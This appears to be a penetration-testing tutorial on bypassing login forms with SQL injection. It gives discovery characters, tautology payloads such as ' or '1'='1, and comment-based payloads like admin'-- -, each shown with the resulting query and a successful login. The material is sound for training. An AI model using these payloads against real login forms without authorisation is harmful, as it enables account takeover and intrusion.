# SQL Injection Authentication Bypass.
## Index.
1. [SQLI Discovery.](#sqli-discovery)
2. [OR Injection.](#or-injection)
   - [Operator Precedence.](#operator-precedence)
   - [Injection knowing the username.](#injection-knowing-the-username)
   - [Injection without knowing the username.](#injection-without-knowing-the-username)
4. [Authentication Bypass.](#authentication-bypass)

## SQLi Discovery
Before we start subverting the web application's logic and attempting to bypass the authentication, we _first have to test whether the login form is vulnerable to SQL injection_. To do that, we will try to __add one of the below payloads after our username and see if it causes any errors or changes how the page behaves__:
| Payload |	URL Encoded |
| ------- | ----------- |
|    '    | 	  %27     |
|    "    |   	%22     |
|    #   	|     %23     |
|    ;    | 	  %3B     |
|    ) 	  |     %29     |

>In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

So, let us start by injecting a single quote:
![2](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a8314106-8cd4-41c9-8e26-cdf8c9a4b53b)
We see that a __SQL error was thrown__ instead of the Login Failed message. The page threw an error because the resulting query was:
```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```
The quote we entered resulted in an odd number of quotes, causing a syntax error. 

## OR Injection
We would need the query __always to return true, regardless of the username and password entered, to bypass the authentication__. To do this, we can _abuse the `OR` operator in our SQL injection_.
The MySQL documentation for operation precedence states that the `AND` _operator would be evaluated before the_ `OR` _operator_.

### Operator Precedence
[Operator Precedences](https://movefeng.com/mysql-manual/operator-precedence.html) are shown in the following list, from highest precedence to the lowest. Operators that are shown together on a line have the same precedence.
```sql 
INTERVAL
BINARY, COLLATE
!
- (unary minus), ~ (unary bit inversion)
^
*, /, DIV, %, MOD
-, +
<<, >>
&
|
= (comparison), <=>, >=, >, <=, <, <>, !=, IS, LIKE, REGEXP, IN
BETWEEN, CASE, WHEN, THEN, ELSE
NOT
AND, &&
XOR
OR, ||
= (assignment), :=
```

### Injection knowing the username.
An example of a condition that will always return true is `'1'='1'`. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use `'1'='1`, so the remaining single quote from the original query would be in its place.<br />
So, if we inject the below condition and have an OR operator between it and the original condition, _if we know the username_ it should always return true:

<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/30f186b9-3dcc-41e2-bb01-5018080b3cfb" width="600" alt="Sublime's custom image"/>
</p>

<br />

> The `AND` operator will be evaluated first, and it will return false. Then, the `OR` operator would be evalutated, and if either of the statements is true, it would return `TRUE`. Since `1=1` always returns true, __this query will return true, and it will grant us access__.


<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/7bb93940-ea45-410c-be02-08850331b832" width="700" alt="Sublime's custom image"/>
</p>

<br />

### Injection without knowing the username.
It's posibble that we don't know any username, that's not a problem cause we can make a true query even if we don't know any username or password.

To successfully log in once again, we will need an overall true query. This can be achieved by injecting an OR condition into the password field too, so it will always return true. Let us try `something' or '1'='1` as the password.
```sql
SELECT * FROM logins WHERE username='' OR '1'='1' AND password = '' OR '1'='1';
```


>The additional OR condition resulted in a _true query overall_, as the __WHERE clause returns everything in the table, and the user present in the first row is logged in__. In this case, as both conditions will return `TRUE`, we do not have to provide a test username and password and can directly start with the `'` injection and log in with just `' or '1' = '1`.


<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/3071a421-2cbc-43f5-8bb9-aafb5d700e62" width="700" alt="Sublime's custom image"/>
</p>

## Authentication Bypass
The payload we have been using is just one of many options, we can see more of them in [PayloadsAllTheThings - Authentication Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass).

### Using comments.
The SQLI authentication we have been bypassing in the previous examples was an easy query, sometimes we can face more difficult querys that may break the sense of our injection, like:
```sql
SELECT * FROM logins WHERE (username='' AND id > 1) AND password = '3590cb8af0bbb9e78c343b52b93773c9';
```
> We see that the query is preventing us to login as the admin because of the condicion `id > 1`. Additionally, we also see that the password was hashed before being used in the query, even if the password field is empty the server assigns a default hash for it (`d41d8cd98f00b204e9800998ecf8427e`). This will prevent us from injecting through the password field because the input is changed to a hash.

The way to bypass it is using SQL comments, using them we can ignore a certain part of the query. We can use `-- -` and `#`, in addition to an in-line comment `/**/` (though this is not usually used in SQL injections).
> If you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

Let us go back to our previous example and inject `'admin'-- -` as our username. The final query will be:

```sql
SELECT * FROM logins WHERE (username='admin' -- -
```
As we can see the query is still wrong because we neet to close the brackets. But, if we close the query properly using `' OR '1' = '1') -- -`, we will bypass the authentication process.
```sql
SELECT * FROM logins WHERE (username=' OR '1' = '1') -- -
```
![6](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/5c45d0b8-c951-457b-aa60-e2e11e46111d)





